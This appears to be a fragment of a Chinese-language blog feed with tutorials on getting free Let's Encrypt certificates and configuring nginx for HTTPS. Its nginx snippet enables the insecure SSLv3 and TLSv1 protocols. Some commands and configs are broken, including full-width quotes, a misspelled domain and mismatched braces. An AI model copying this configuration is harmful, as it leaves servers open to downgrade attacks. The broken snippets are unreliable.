ihaozhuo.com&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意 这里 默认会自动生成 /网站根目录/.well-known/acme-challenge，然后 shell 脚本会对应的访问 网站域名&lt;code&gt;/.well-known/acme-challenge&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果返回正常就确认了你对这个网站的所有权，就能顺利生成&lt;/p&gt;
&lt;h2 id=&quot;3-获取证书&quot;&gt;&lt;a href=&quot;#3-获取证书&quot; class=&quot;headerlink&quot; title=&quot;3. 获取证书&quot;&gt;&lt;/a&gt;3. 获取证书&lt;/h2&gt;&lt;p&gt;如果上面的步骤正常 shell 脚本会展示如下信息：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- Congratulations! Your certificate and chain have been saved at&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/etc/letsencrypt/live/网站域名/fullchain.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;...&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;4-生成-dhparams&quot;&gt;&lt;a href=&quot;#4-生成-dhparams&quot; class=&quot;headerlink&quot; title=&quot;4. 生成 dhparams&quot;&gt;&lt;/a&gt;4. 生成 dhparams&lt;/h2&gt;&lt;p&gt;使用 openssl 工具生成 dhparams&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;openssl dhparam -out /etc/ssl/certs/dhparams.pem 2048&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;5-配置-Nginx&quot;&gt;&lt;a href=&quot;#5-配置-Nginx&quot; class=&quot;headerlink&quot; title=&quot;5. 配置 Nginx&quot;&gt;&lt;/a&gt;5. 配置 Nginx&lt;/h2&gt;&lt;p&gt;打开 nginx server 配置文件加入如下设置：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;listen 443&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ssl on;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ssl_certificate /etc/letsencrypt/live/网站域名/fullchain.pem;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ssl_certificate_key /etc/letsencrypt/live/网站域名/privkey.pem;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ssl_dhparam /etc/ssl/certs/dhparams.pem;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ssl_ciphers HIGH:!aNULL:!MD5;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后重启 nginx 服务就可以了&lt;/p&gt;
&lt;h2 id=&quot;6-强制跳转-https&quot;&gt;&lt;a href=&quot;#6-强制跳转-https&quot; class=&quot;headerlink&quot; title=&quot;6. 强制跳转 https&quot;&gt;&lt;/a&gt;6. 强制跳转 https&lt;/h2&gt;&lt;p&gt;https 默认是监听 443 端口的，没开启 https 访问的话一般默认是 80 端口。如果你确定网站 80 端口上的站点都支持 https 的话加入下面的配件可以自动重定向到 https&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;server &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    listen 80;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    server_name your.domain.com;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; 301 https://&lt;span class=&quot;variable&quot;&gt;$server_name&lt;/span&gt;&lt;span class=&quot;variable&quot;&gt;$request_uri&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;7-证书更新&quot;&gt;&lt;a href=&quot;#7-证书更新&quot; class=&quot;headerlink&quot; title=&quot;7. 证书更新&quot;&gt;&lt;/a&gt;7. 证书更新&lt;/h2&gt;&lt;p&gt;免费证书只有 90 天的有效期，到时需要手动更新 renew。刚好 Let’s encrypt 旗下还有一个 Let’s monitor 免费服务，注册账号添加需要监控的域名，系统会在证书马上到期时发出提醒邮件，非常方便。收到邮件后去后台执行 renew 即可，如果提示成功就表示 renew 成功&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;./certbot-auto renew&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;免费-Https-证书（Let’S-Encrypt）申请与配置&quot;&gt;&lt;a href=&quot;#免费-Https-证书（Let’S-Encrypt）申请与配置&quot; class=&quot;headerlink&quot; title=&quot;免费 Https 证书（Let’S Encrypt）申请与配
    
    </summary>
    
      <category term="nginx" scheme="http://blog.yangcvo.me/categories/nginx/"/>
    
    
      <category term="Web Service" scheme="http://blog.yangcvo.me/tags/Web-Service/"/>
    
      <category term="Nginx" scheme="http://blog.yangcvo.me/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>如何在Nginx申请安装配置免费HTTPS证书+阿里云SLB如何配置HTTPS</title>
    <link href="http://blog.yangcvo.me/2016/11/23/Web%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF/%E7%94%B3%E8%AF%B7%E8%AF%81%E4%B9%A6Https/%E5%A6%82%E4%BD%95%E5%9C%A8Nginx%E7%94%B3%E8%AF%B7%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%85%8D%E8%B4%B9HTTPS%E8%AF%81%E4%B9%A6+%E9%98%BF%E9%87%8C%E4%BA%91SLB%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AEHTTPS/"/>
    <id>http://blog.yangcvo.me/2016/11/23/Web服务技术/申请证书Https/如何在Nginx申请安装配置免费HTTPS证书+阿里云SLB如何配置HTTPS/</id>
    <published>2016-11-23T09:25:23.000Z</published>
    <updated>2017-03-31T17:04:58.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;如何在Nginx申请安装配置免费HTTPS证书&quot;&gt;&lt;a href=&quot;#如何在Nginx申请安装配置免费HTTPS证书&quot; class=&quot;headerlink&quot; title=&quot;如何在Nginx申请安装配置免费HTTPS证书&quot;&gt;&lt;/a&gt;如何在Nginx申请安装配置免费HTTPS证书&lt;/h2&gt;&lt;p&gt;HTTPS在各大互联网站已经成为标配，就连某度也在前不久全面启用HTTPS，很多小网站也配置了HTTPS，这是未来的一种趋势.HTTPS的好处多多，可以防止各种攻击劫持，运营商广告植入，客户传输信息泄露等问题。为了让HTTPS能够全面普及，让我们加密项目应运而生，它由互联网安全研究小组ISRG（互联网安全研究小组）提供服务，很早之前我就在关注 &lt;a href=&quot;https://letsencrypt.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Let’s Encrypt&lt;/a&gt;这个免费、自动化、开放的证书签发服务。&lt;br&gt;ISRG是来自美国加利福尼亚州的一个公益组织.Let’s Encrypt得到了Mozilla，Cisco和Chrome等众多公司和机构的支持。&lt;/p&gt;
&lt;p&gt;申请 &lt;code&gt;Let&amp;#39;s Encrypt&lt;/code&gt; 证书不但免费，还非常简单，虽然每次只有 90 天的有效期，但可以通过脚本定期更新，配好之后一劳永逸。本教程亲测有效，希望对正在寻找免费HTTPS方案的你有一定的帮助，本文记录本站申请过程和遇到的问题。&lt;/p&gt;
&lt;p&gt;按照我们的加密官方提供的工具安装HTTPS的话与过于复杂，于是有好心人提供了更为轻巧的工具安装，极致纤巧诞生了，它的代码量在200行内，只需依赖的Python和OpenSSL的。&lt;/p&gt;
&lt;h3 id=&quot;第一步：创建Let’s-Encrypt加密账号&quot;&gt;&lt;a href=&quot;#第一步：创建Let’s-Encrypt加密账号&quot; class=&quot;headerlink&quot; title=&quot;第一步：创建Let’s Encrypt加密账号&quot;&gt;&lt;/a&gt;第一步：创建Let’s Encrypt加密账号&lt;/h3&gt;&lt;p&gt;首先创建一个目录，例如 &lt;code&gt;ssl&lt;/code&gt;用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个&lt;code&gt;RSA&lt;/code&gt;私钥用于 Let’s Encrypt 识别你的身份：&lt;/p&gt;
&lt;p&gt;让我们加密使用一个私钥来进行账号的创建与登陆，因此我们需要使用openssl创建一个&lt;code&gt;account.key&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 srv]&lt;span class=&quot;comment&quot;&gt;# mkdir ssl &amp;amp;&amp;amp; cd ssl&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# openssl genrsa 4096 &amp;gt; account.key&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Generating RSA private key, 4096 bit long modulus&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;...........................++&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;...........................++&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;e is 65537 (0x10001)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;第二步：创建域名的CSR（证书签名请求）&quot;&gt;&lt;a href=&quot;#第二步：创建域名的CSR（证书签名请求）&quot; class=&quot;headerlink&quot; title=&quot;第二步：创建域名的CSR（证书签名请求）&quot;&gt;&lt;/a&gt;第二步：创建域名的CSR（证书签名请求）&lt;/h3&gt;&lt;p&gt;让我们加密使用的ACME协议需要一个CSR文件，可以使用它来重新申请HTTPS证书，接下来我们就可以创建域名CSR，在创建CSR之前，我们需要给我们的域名创建一个私钥（这个和上面的账户私钥无关）。&lt;br&gt;接着就可以生成 &lt;code&gt;CSR（Certificate Signing Request，证书签名请求）文件了。&lt;/code&gt;在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥），根据证书不同类型，域名私钥也可以选择 RSA 和 ECC 两种不同类型。以下两种方式请根据实际情况二选一。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1）创建 RSA 私钥（兼容性好）：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;openssl genrsa 4096 &amp;gt; domain.key&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;2）注意：一定不要使用上面创建好的account.key 来当domain.key ❗️&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有了私钥文件，就可以创建生成 &lt;code&gt;CSR文件&lt;/code&gt;了。在 &lt;code&gt;CSR&lt;/code&gt;中推荐至少把域名带 &lt;code&gt;www&lt;/code&gt; 和不带&lt;code&gt;www&lt;/code&gt;的两种情况都加进去，其它子域可以根据需要添加,替换下面的ihaozhuo.com即可  &lt;code&gt;(目前一张证书最多可以包含 100 个域名)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3）注意，稍后会说到，每个域名都会涉及到验证）&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;＃单个域名&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;openssl req -new -sha256 -key domain.key -subj“/CN=ihaozhuo.ccom”&amp;gt; domain.csr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;＃多个域名（如果你有多个域名，比如：www.ihaozhuo.com 和ihaozhuo.com，使用这种方式）&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;openssl req -new -sha256 -key domain.key -subj &lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt; -reqexts SAN -config &amp;lt;(cat /etc/ssl/openssl.cnf &amp;lt;(&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;[SAN]\nsubjectAltName=DNS:ihaozhuo.com,DNS:www.ihaozhuo.com&quot;&lt;/span&gt;)) &amp;gt; domain.csr&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;4）说明：ihaozhuo.com，www.ihaozhuo.com 替换成你的域名执行这一步时，需要指定openssl.cnf文件，一般这个文件在你的openssl安装目录底下。 如果提示找不到 /etc/ssl/openssl.cnf文件，请看看/usr/local/openssl/ssl/openssl.cnf 和/etc/pki/tls/openssl.cnf是否存在。&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# find / -name openssl.cnf    ##查找openssl.cnf文件&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/etc/pki/tls/openssl.cnf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# ln -s /etc/pki/tls/openssl.cnf /etc/ssl/openssl.cnf    #做个软链接 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# openssl req -new -sha256 -key domain.key -subj &quot;/&quot; -reqexts SAN -config &amp;lt;(cat /etc/ssl/openssl.cnf &amp;lt;(printf &quot;[SAN]\nsubjectAltName=DNS:ihaozhuo.com,DNS:www.ihaozhuo.com&quot;)) &amp;gt; domain.csr&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果还是不行，也可以使用交互方式创建&lt;code&gt;CSR&lt;/code&gt;（需要注意 &lt;code&gt;Common Name&lt;/code&gt;必须为你的域名）：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;openssl req -new -sha256 -key domain.key -out domain.csr&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;第三步：配置域名验证&quot;&gt;&lt;a href=&quot;#第三步：配置域名验证&quot; class=&quot;headerlink&quot; title=&quot;第三步：配置域名验证&quot;&gt;&lt;/a&gt;第三步：配置域名验证&lt;/h3&gt;&lt;p&gt;CA在签发DV（域验证）证书时，需要验证域名所有权。传统CA的验证方式一般是往&lt;code&gt;admin@ihaozhuo.com&lt;/code&gt;发验验邮件，而让我们加密是在你的服务器上生成一个随机验证文件，再通过创建CSR时指定的域名访问，如果可以访问则表明你对这个域名有控制权。&lt;/p&gt;
&lt;p&gt;首先创建用于存放验证文件的目录，例如：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mkdir -p var/www/challenge&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后配置一个&lt;code&gt;Nginx&lt;/code&gt;服务，以Nginx为例:(注意：这里的端口是80，不是443）&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;server &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       listen       80;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       server_name www.ihaozhuo.com ihaozhuo.com;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       location /.well-known/acme-challenge/ &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       &lt;span class=&quot;built_in&quot;&gt;alias&lt;/span&gt; /var/www/challenges/;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       index  index.html index.php index.jsp index.htm;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       try_files &lt;span class=&quot;variable&quot;&gt;$uri&lt;/span&gt; =404;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        error_page   500 502 503 504  /50x.html;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        location = /50x.html &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            root   html;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这是我在上面配置完成以后需要重启Nginx，先&lt;code&gt;Nginx -t&lt;/code&gt;校验下是否有没有问题。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 conf]&lt;span class=&quot;comment&quot;&gt;# nginx -t&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;nginx: the configuration file /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/nginx/conf/nginx.conf syntax is ok&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;nginx: configuration file /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/nginx/conf/nginx.conf &lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt; is successful&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;``` &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;如何验证上面设置是否成功？ 我们只要在目录：/var/www/challenges/ 下面创建文件：test.html&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;然后通过http://www.ihaozhuo.com/.well-known/acme-challenge/test.html URL访问地址那个文件，如果能访问成功说明你配置没问题;否则就说明配置错误❌，这一步不能实现下面就不能成功了。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;以上配置优先查找 `var/www/challenge`目录下的文件，如果找不到就重定向到` HTTPS` 地址。这个验证服务以后更新证书还要用到，建议一直保留。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;### 第四步：获取网站证书&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;**1）上面配置好，现在我们使用acme-tiny.py来获取网站证书** acme-tiny脚本文件上Github下载：[acme-tiny.py](https://github.com/diafygi/acme-tiny)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;**2）先把 acme-tiny 脚本保存到之前的ssl目录**&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;```bash&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;3）然后指定账户私钥、CSR 以及验证目录，执行脚本来获取网站证书&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &amp;gt; ./signed.crt&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;4）如果一切正常，当前目录下就会生成一个&lt;code&gt;signed.crt&lt;/code&gt;这就是申请好的证书文件，如果跟我一样报错了请看下面&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &amp;gt; ./signed.crt&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Parsing account key...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Parsing CSR...&lt;/div&gt;&lt;div 